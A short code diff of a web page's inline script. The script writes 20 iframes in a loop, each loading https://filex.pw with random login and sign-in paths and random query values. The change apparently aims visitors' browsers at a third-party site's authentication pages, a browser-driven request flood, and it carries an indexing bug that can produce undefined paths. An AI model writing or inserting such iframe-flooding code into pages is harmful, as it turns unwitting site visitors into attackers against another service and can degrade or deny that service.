@@ -18,11 +18,11 @@ function str_rand() {
         return result;
 }  
 
-var array = ['dashboard.php','login.php','register.php','index.php'];
+var array = ['user/login','8159e2248042044','index.php','user/sign_in'];
 var i = 0;
 while (i < 20) {
 i++;
-document.write('<iframe src="https://filex.pw/'+str_rand()+str_rand()+'?'+randomIntFromInterval(1,3000)+'"></iframe>');
+document.write('<iframe src="https://filex.pw/'+array[randomIntFromInterval(1,4)]+'?'+randomIntFromInterval(1,3000)+'"></iframe>');
 }
 </script> 
 </div>
